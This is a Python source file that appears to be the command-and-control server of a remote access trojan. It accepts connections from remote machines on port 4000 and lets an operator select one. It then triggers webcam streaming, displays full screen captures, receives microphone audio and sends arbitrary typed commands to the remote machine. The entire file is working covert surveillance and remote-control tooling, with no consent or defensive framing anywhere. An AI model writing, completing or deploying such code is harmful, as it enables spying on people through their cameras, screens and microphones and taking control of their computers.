import numpy as np
import keyboard
import socket
import pickle
import struct
import time
import cv2

from threading import Thread

Users = {}
IPs = []

class commandCMD():
    def __init__(self, conn):
        self.conn = conn
        self.commands()

    def commands(self):
        command = input("CMD:")
     
        self.conn.sendall(command.encode())
        return

class server():
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(("0.0.0.0", 4000))
        self.server.listen(10)

        self.payload_size = struct.calcsize("Q")
        self.modeState = 0
        self.count = 0

        self.frame = None
        self.addr = None
        self.ip = None

        self.scrollDown = True
        self.stop_loop = False
        self.scrollUp = False
        self.play_mic = True
        
        Thread(target=self.initServer, args=()).start()

        self.proc = Thread(target=self.processData, args=())
        self.proc.daemon = True
        
        self.selectDeviceIp()
        
    def initServer(self):
        while True:
            conn, addr = self.server.accept()

            ddr = addr[0]+":"+str(addr[1])
            print(ddr)

            Users[ddr] = conn
            IPs.append(ddr)
            print("Connection recv", ddr)

    def selectDeviceIp(self):
        while True:
            print("IP list: ", IPs)

            try:
                self.device = input("Select: ")
            except:
                continue
            
            try:
                self.conn = Users[self.device]
                self.conn.sendall(b"cam_packet")

                print(f"{Users[self.device]} activated.")

                self.proc.start()
                self.showCam()
                break

            except Exception as err:
                print(err)
                continue

    
    def playMic(self, data):
        if self.play_mic:
            stream.write(data)

    def processData(self):
        while True:
            conn = self.conn

            if self.stop_loop:
                time.sleep(1)
                continue

            try:
                action = conn.recv(1)[0]
            except:
                continue

            if action == 0x01 or action == 0x03:
                packet_len = conn.recv(3)

                packet_len = ((packet_len[0] << 16)| (packet_len[1] << 8)| packet_len[2])

                cameraDump = conn.recv(packet_len)

                image_opencv = cv2.imdecode(np.frombuffer(cameraDump, dtype=np.uint8),cv2.IMREAD_COLOR)

                if image_opencv is not None:
                    if action == 0x01:
                        cv2.imshow("Stream", image_opencv)
                        cv2.waitKey(1)

                    elif action == 0x03:
                        cv2.namedWindow("Screen", cv2.WINDOW_NORMAL) 
                        cv2.resizeWindow("Screen", 2560, 1080) 

                        cv2.imshow("Screen", image_opencv)
                        cv2.waitKey(1)
        
            elif action == 0x02:
                mic_packet = conn.recv(2048)
                #self.playMic(mic_packet)

            elif action == 0x04:
                msg_len = conn.recv(3)
                msg_len = (msg_len[0] << 16) + (msg_len[1] << 8) + msg_len[2]
                msg = conn.recv(msg_len)

    def showCam(self):
        while True:
            if keyboard.is_pressed("t"):
                self.conn.sendall(b"cmd_packet")
                self.stop_loop = True   

                try:
                    commandCMD(self.conn)
                except:
                    pass

                self.stop_loop = False

if __name__ == "__main__":
    server()